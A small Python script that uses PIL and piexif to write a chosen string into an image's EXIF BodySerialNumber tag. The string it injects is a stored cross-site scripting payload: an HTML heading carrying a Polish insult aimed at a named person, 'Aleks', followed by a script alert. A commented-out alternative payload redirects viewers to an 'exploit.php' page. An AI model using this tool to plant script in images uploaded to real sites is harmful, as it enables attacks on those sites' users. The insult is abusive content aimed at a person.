import sys
from PIL import Image
import piexif

def add_custom_exif_tag(image_path, custom_tag_key, custom_tag_value):
    try:
        # Open the image file
        img = Image.open(image_path)

        # Get existing EXIF data
        exif_data = img.info.get("exif", b'')

        # Decode the existing EXIF data using piexif
        exif_dict = piexif.load(exif_data) if exif_data else {}

        # Check if 'Exif' key is present, if not, initialize it
        if 'Exif' not in exif_dict:
            exif_dict['Exif'] = {}

        # Add or modify the custom tag
        exif_dict['Exif'][custom_tag_key] = custom_tag_value

        # Encode the updated EXIF data using piexif
        exif_bytes = piexif.dump(exif_dict)

        # Save the modified image with updated EXIF data
        modified_path = "modified_" + image_path
        img.save(modified_path, exif=exif_bytes)

        print(f"Modified image saved successfully: {modified_path}")

    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script_name.py <image_path>")
        sys.exit(1)

    image_path = sys.argv[1]
    custom_tag_key = piexif.ExifIFD.BodySerialNumber # Example custom tag key (change as needed)
    custom_tag_value = "<h1>Aleks skurwysyn</h1><script>alert('test');</script>"  # Example custom tag value (change as needed)
    # custom_tag_value = "<script>window.location.replace(\"./exploit.php\")</script>"
    add_custom_exif_tag(image_path, custom_tag_key, custom_tag_value)
